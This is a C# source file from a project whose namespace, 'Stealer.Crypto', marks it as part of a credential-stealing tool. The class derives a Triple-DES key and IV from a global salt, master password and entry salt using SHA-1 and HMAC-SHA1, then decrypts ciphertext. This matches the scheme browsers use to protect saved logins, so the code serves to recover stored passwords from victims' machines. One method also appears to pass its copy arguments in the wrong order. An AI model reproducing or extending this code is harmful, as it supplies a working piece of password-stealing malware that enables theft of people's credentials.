using System;
using System.IO;
using System.Security.Cryptography;

namespace Stealer.Crypto
{
    internal class TripleDes
    {
        private byte[] CipherText { get; }
        private byte[] GlobalSalt { get; }
        private byte[] MasterPassword { get; }
        private byte[] EntrySalt { get; }
        public byte[] Key { get; private set; }
        public byte[] Vector { get; private set; }

        public TripleDes(byte[] cipherText, byte[] globalSalt, byte[] masterPass, byte[] entrySalt)
        {
            this.CipherText = cipherText;
            this.GlobalSalt = globalSalt;
            this.MasterPassword = masterPass;
            this.EntrySalt = entrySalt;
        }

        public TripleDes(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt)
        {
            this.GlobalSalt = globalSalt;
            this.MasterPassword = masterPassword;
            this.EntrySalt = entrySalt;
        }

        public void ComputeVoid()
        {
            SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
            byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
            Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
            byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
            byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
            Array.Copy(array2, 0, array3, 0, array2.Length);
            Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
            byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
            for (int i = this.EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hmacsha = new HMACSHA1(key))
            {
                array6 = hmacsha.ComputeHash(array5);
                byte[] array7 = hmacsha.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
                Array.Copy(array7, 0, array8, 0, array7.Length);
                Array.Copy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
                array9 = hmacsha.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            this.Key = new byte[24];
            for (int j = 0; j < this.Key.Length; j++)
            {
                this.Key[j] = array10[j];
            }
            this.Vector = new byte[8];
            int num = this.Vector.Length - 1;
            for (int k = array10.Length - 1; k >= array10.Length - this.Vector.Length; k--)
            {
                this.Vector[num] = array10[k];
                num--;
            }
        }

        public byte[] Compute()
        {
            byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Buffer.BlockCopy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
            Buffer.BlockCopy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
            byte[] array2 = new SHA1Managed().ComputeHash(array);
            byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
            Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
            Buffer.BlockCopy(this.EntrySalt, 0, array3, this.EntrySalt.Length, array2.Length);
            byte[] key = new SHA1Managed().ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
            for (int i = this.EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hmacsha = new HMACSHA1(key))
            {
                array6 = hmacsha.ComputeHash(array5);
                byte[] array7 = hmacsha.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
                Buffer.BlockCopy(array7, 0, array8, 0, array7.Length);
                Buffer.BlockCopy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
                array9 = hmacsha.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            this.Key = new byte[24];
            for (int j = 0; j < this.Key.Length; j++)
            {
                this.Key[j] = array10[j];
            }
            this.Vector = new byte[8];
            int num = this.Vector.Length - 1;
            for (int k = array10.Length - 1; k >= array10.Length - this.Vector.Length; k--)
            {
                this.Vector[num] = array10[k];
                num--;
            }
            byte[] sourceArray = DecryptByteDesCbc(this.Key, this.Vector, this.CipherText);
            byte[] array11 = new byte[24];
            Array.Copy(sourceArray, array11, array11.Length);
            return array11;
        }

        public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            byte[] array = new byte[512];
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        cryptoStream.Read(array, 0, array.Length);
                        return array;
                    }
                }
            }
        }
    }
}
